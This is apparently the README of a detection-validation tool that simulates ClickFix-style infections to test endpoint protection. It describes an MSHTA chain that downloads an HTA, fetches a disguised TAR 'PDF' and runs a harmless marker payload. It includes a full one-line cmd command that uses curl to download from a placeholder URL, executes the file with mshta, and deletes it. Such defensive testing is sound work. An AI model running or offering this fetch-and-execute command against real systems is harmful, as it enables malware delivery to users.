# clickfix_detecion_validator

These click-fix validations are a benign test of endpoint protection suites for detection of two infection methods observed in a production environment. 

## MSHTA

This method leverages a pasted command that downloads an HTA that then leverages cURL to download an extract a "PDF" that is actually a TAR archive containing the payload. The payload is then executed. If a file `C:\Users\<username>\Documents\928252966059280400\clickfix-sim-payload.txt` is created, the "infection" succeeded.

### Execution

cmd /v:on /c "set "u=%LOCALAPPDATA%\B.max" && curl -s -k -L -o "!u!" "https://<your_url.com>/B.max" && mshta "!u!" && del /f "!u!""
